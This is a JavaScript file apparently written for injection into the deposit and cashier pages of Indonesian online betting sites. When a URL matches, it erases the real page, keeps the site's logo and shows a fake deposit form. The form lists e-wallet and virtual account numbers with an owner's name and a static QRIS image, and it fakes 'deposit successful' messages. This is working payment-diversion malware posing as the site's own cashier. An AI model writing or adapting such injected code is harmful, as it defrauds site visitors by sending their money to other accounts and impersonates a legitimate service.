(function () {

const oldLogo =
document.querySelector('header.header-full-width img')?.src ||
document.querySelector('#sidebar img')?.src ||
document.querySelector('img[src*="logo"]')?.src ||
'';


const targetPaths = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
];

const currentUrl =
    window.location.pathname + window.location.search;

const isMatch = targetPaths.some(path =>
    currentUrl.includes(path)
);

if (!isMatch) return;

/* HAPUS TOTAL HALAMAN LAMA */
document.head.innerHTML = `
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Deposit</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

body{
    background:#0f172a;
    color:#fff;
    min-height:100vh;
    padding:20px;
}

.container{
    max-width:450px;
    margin:auto;
}

.logo{
    text-align:center;
    margin-bottom:18px;
}

.logo img{
    width:220px;
    max-width:100%;
}

.marquee{
    width:100%;
    overflow:hidden;
    background:#111827;
    border:1px solid rgba(255,255,255,.1);
    padding:12px 0;
    border-radius:12px;
    margin-bottom:20px;
}

.marquee p{
    white-space:nowrap;
    display:inline-block;
    animation:marquee 15s linear infinite;
    color:#facc15;
    font-size:13px;
    font-weight:500;
}

@keyframes marquee{
    0%{
        transform:translateX(100%);
    }
    100%{
        transform:translateX(-100%);
    }
}

.tabs{
    display:flex;
    gap:10px;
    margin-bottom:20px;
}

.tab-btn{
    flex:1;
    padding:14px;
    border:none;
    border-radius:12px;
    background:#1e293b;
    color:#fff;
    cursor:pointer;
    font-weight:600;
    font-size:15px;
}

.tab-btn.active{
    background:#2563eb;
}

.tab-content{
    display:none;
}

.tab-content.active{
    display:block;
}

.card{
    background:#111827;
    padding:18px;
    border-radius:18px;
    border:1px solid rgba(255,255,255,.08);
}

.form-group{
    margin-bottom:16px;
}

label{
    display:block;
    margin-bottom:8px;
    font-size:14px;
    font-weight:500;
}

input,
select{
    width:100%;
    padding:14px;
    border:none;
    border-radius:12px;
    background:#1e293b;
    color:#fff;
    outline:none;
    font-size:14px;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:12px;
    background:#2563eb;
    color:#fff;
    font-weight:600;
    font-size:15px;
    cursor:pointer;
}

.rekening-card{
    display:none;
    background:#1e293b;
    padding:16px;
    border-radius:16px;
    margin-bottom:16px;
}

.rekening-bank{
    font-size:18px;
    font-weight:700;
}

.rekening-number{
    margin-top:10px;
    font-size:22px;
    font-weight:600;
    word-break:break-all;
}

.rekening-owner{
    margin-top:6px;
    color:#cbd5e1;
}

.copy-btn{
    margin-top:14px;
    background:#22c55e;
}

.popup{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,.7);
    display:none;
    align-items:center;
    justify-content:center;
    z-index:999;
}

.popup-box{
    background:#111827;
    padding:25px;
    border-radius:18px;
    text-align:center;
    width:90%;
    max-width:320px;
}

.loader{
    width:45px;
    height:45px;
    border:4px solid rgba(255,255,255,.2);
    border-top:4px solid #fff;
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin:auto;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

.qris-box{
    display:none;
    text-align:center;
    margin-top:20px;
}

.qris-box img{
    width:100%;
    border-radius:18px;
}

.status{
    margin-top:12px;
}

.pending{
    color:#ef4444;
    font-weight:700;
}

.expired{
    color:#facc15;
    font-weight:700;
}

.guide-img{
    width:100%;
    margin-top:20px;
    border-radius:18px;
}

details{
    margin-top:20px;
    background:#1e293b;
    padding:14px;
    border-radius:12px;
}

details ol{
    margin-top:10px;
    padding-left:18px;
    line-height:1.8;
}

.copyright{
    text-align:center;
    margin-top:25px;
    color:#94a3b8;
    font-size:13px;
}

.help-btn{
    margin-top:12px;
    background:#16a34a;
}

.help-btn:hover{
    opacity:.9;
}

</style>
`;

document
.querySelectorAll(
'#sidebar,#overlay,header,.header-full-width'
)
.forEach(el=>{
    el.remove();
});

document.body.innerHTML = `

<div class="container">

<div class="logo">
<img src="${oldLogo}">
</div>

<div class="marquee">
<p>
Deposit Instant Menggunakan Qris, Deposit pertama kali Wajib menggunakan kode unik, Contoh (50,888) minimal Deposit 50 Ribu Rupiah
</p>
</div>

<div class="tabs">

<button class="tab-btn active" id="tabBank">
Bank/Ewallet
</button>

<button class="tab-btn" id="tabQris">
Qris
</button>

</div>

<!-- TAB BANK -->

<div class="tab-content active" id="bank">

<div class="card">

<div class="form-group">

<label>Tujuan Deposit</label>

<select id="tujuan">

<option value="">
Pilih Tujuan Deposit
</option>

<option value="088214538915"
data-bank="DANA"
data-name="SURWATI">
DANA - 088214538915 - SurWati
</option>

<option value="3901088214538915"
data-bank="BCA"
data-name="BCA VA">
BCA - 3901088214538915 - BCA VA
</option>

<option value="88810088214538915"
data-bank="BRI"
data-name="BRI VA">
BRI - 88810088214538915 - BRI VA
</option>

<option value="8810088214538915"
data-bank="BNI"
data-name="BNI VA">
BNI - 8810088214538915 - BNI VA
</option>

<option value="89508088214538915"
data-bank="MANDIRI"
data-name="MANDIRI VA">
MANDIRI - 89508088214538915 - MANDIRI VA
</option>

</select>

</div>

<div class="rekening-card" id="rekeningCard">

<div class="rekening-bank" id="bankName"></div>

<div class="rekening-number" id="rekeningNumber"></div>

<div class="rekening-owner" id="rekeningOwner"></div>

<button class="copy-btn" id="copyBtn">
Salin Nomor Rekening
</button>

</div>

<div class="form-group">

<label>Nominal Deposit</label>

<input type="text"
id="nominalBank"
placeholder="Minimal 50,000">

</div>

<div class="form-group">

<label>Bonus Promosi</label>

<select>

<option>Tanpa Bonus</option>
<option>Bonus Deposit 100%</option>
<option>Garansi Kekalahan</option>
<option>Claim Promo Saldo Awal</option>
<option>Deposit 500K Get 5JT</option>
<option>Deposit 1JT Get 10JT</option>

</select>

</div>

<button id="submitDeposit">
Konfirmasi Deposit
</button>

<button id="helpDeposit" class="help-btn">
💬 Bantuan Deposit
</button>

</div>

</div>

<!-- TAB QRIS -->

<div class="tab-content" id="qris">

<div class="card">

<div class="form-group">

<label>Nominal Deposit</label>

<input type="text"
id="nominalQris"
placeholder="Minimal 50,000">

</div>

<div class="form-group">

<label>Bonus Promosi</label>

<select>

<option>Tanpa Bonus</option>
<option>Bonus Deposit 100%</option>
<option>Garansi Kekalahan</option>
<option>Claim Promo Saldo Awal</option>
<option>Deposit 500K Get 5JT</option>
<option>Deposit 1JT Get 10JT</option>

</select>

</div>

<button id="buatQrisBtn">
Buat Qris
</button>

<div class="qris-box" id="qrisBox">

<img src="https://imagizer.imageshack.com/v2/320xq70/r/922/UR7NGA.jpg">

<div class="status">
Nominal :
<b id="showNominal"></b>
</div>

<div class="status">
Status :
<span class="pending">Pending</span>
</div>

<div class="status">
Expired :
<span class="expired" id="timer">
03:00
</span>
</div>

<button style="margin-top:18px;"
id="paidBtn">
Saya Telah Membayar
</button>

<img class="guide-img"
src="https://gtyfup2m.112400c1199c.com/poster-QRIS.jpg">

<details>

<summary>
Pemanduan Pembayaran
</summary>

<ol>
<li>Buka aplikasi mobile banking atau e-money</li>
<li>Klik tombol/menu Bayar atau Scan</li>
<li>Scan QR Code</li>
<li>Klik tombol Bayar</li>
</ol>

</details>

</div>

</div>

</div>

<div class="copyright">
inggar2026
</div>

</div>

<div class="popup" id="popup">

<div class="popup-box">

<div class="loader"></div>

<h3 id="popupText">
Loading...
</h3>

</div>

</div>
`;

/* FUNCTIONS */

function openTab(id,el){

document.querySelectorAll('.tab-content')
.forEach(tab=>{
tab.classList.remove('active');
});

document.querySelectorAll('.tab-btn')
.forEach(btn=>{
btn.classList.remove('active');
});

document.getElementById(id)
.classList.add('active');

el.classList.add('active');
}

function showPopup(text){

document.getElementById('popup')
.style.display='flex';

document.getElementById('popupText')
.innerText=text;
}

function hidePopup(){

document.getElementById('popup')
.style.display='none';
}

function formatRupiah(input){

let value =
input.value.replace(/\D/g,'');

if(value){

input.value =
parseInt(value)
.toLocaleString('en-US');

}else{

input.value='';
}
}

function getNumber(val){

return parseInt(
val.replace(/,/g,'')
)||0;
}

/* EVENTS */

document.getElementById('tabBank')
.addEventListener('click',function(){

openTab('bank',this);

});

document.getElementById('tabQris')
.addEventListener('click',function(){

openTab('qris',this);

});

document.getElementById('tujuan')
.addEventListener('change',function(){

let option =
this.options[this.selectedIndex];

if(this.value==''){

document.getElementById('rekeningCard')
.style.display='none';

return;
}

document.getElementById('rekeningCard')
.style.display='block';

document.getElementById('bankName')
.innerText =
option.getAttribute('data-bank');

document.getElementById('rekeningNumber')
.innerText =
option.value;

document.getElementById('rekeningOwner')
.innerText =
option.getAttribute('data-name');

});

document.getElementById('copyBtn')
.addEventListener('click',async function(){

const rekening =
document.getElementById('rekeningNumber')
.innerText
.trim();

try{

await navigator.clipboard
.writeText(rekening);

alert('Nomor rekening berhasil disalin');

}catch(e){

const temp =
document.createElement('textarea');

temp.value = rekening;

document.body.appendChild(temp);

temp.select();

document.execCommand('copy');

document.body.removeChild(temp);

alert('Nomor rekening berhasil disalin');

}

});

document.getElementById('nominalBank')
.addEventListener('input',function(){

formatRupiah(this);

});

document.getElementById('nominalQris')
.addEventListener('input',function(){

formatRupiah(this);

});

document.getElementById('submitDeposit')
.addEventListener('click',function(){

let tujuan =
document.getElementById('tujuan').value;

let nominal =
getNumber(
document.getElementById('nominalBank').value
);

if(tujuan=='' || nominal < 50000){

alert(
'Lengkapi data dan minimal deposit 50,000'
);

return;
}

showPopup('Memproses Deposit...');

setTimeout(()=>{

document.getElementById('popupText')
.innerText =
'Deposit Berhasil, menunggu Persetujuan Admin';

setTimeout(()=>{

window.history.back();

},1500);

},1500);

});

document.getElementById('buatQrisBtn')
.addEventListener('click',function(){

let nominal =
getNumber(
document.getElementById('nominalQris').value
);

if(nominal < 50000){

alert('Minimal deposit 50,000');

return;
}

showPopup('Membuat Qris...');

setTimeout(()=>{

hidePopup();

document.getElementById('qrisBox')
.style.display='block';

document.getElementById('showNominal')
.innerText =
document.getElementById('nominalQris')
.value;

startTimer(180);

},1500);

});

document.getElementById('paidBtn')
.addEventListener('click',function(){

alert(
'Deposit sedang diajukan Sistem'
);

window.history.back();

});


document
.getElementById('helpDeposit')
.addEventListener('click',()=>{

window.open(
'https://direct.lc.chat/19727067/',
'_blank'
);

});

function startTimer(duration){

let timer = duration;

let interval = setInterval(()=>{

let minutes =
Math.floor(timer/60);

let seconds =
timer%60;

minutes =
minutes < 10 ?
"0"+minutes :
minutes;

seconds =
seconds < 10 ?
"0"+seconds :
seconds;

document.getElementById('timer')
.innerText =
minutes + ":" + seconds;

timer--;

if(timer < 0){

clearInterval(interval);

document.getElementById('timer')
.innerText='Expired';

}

},1000);

}

})();
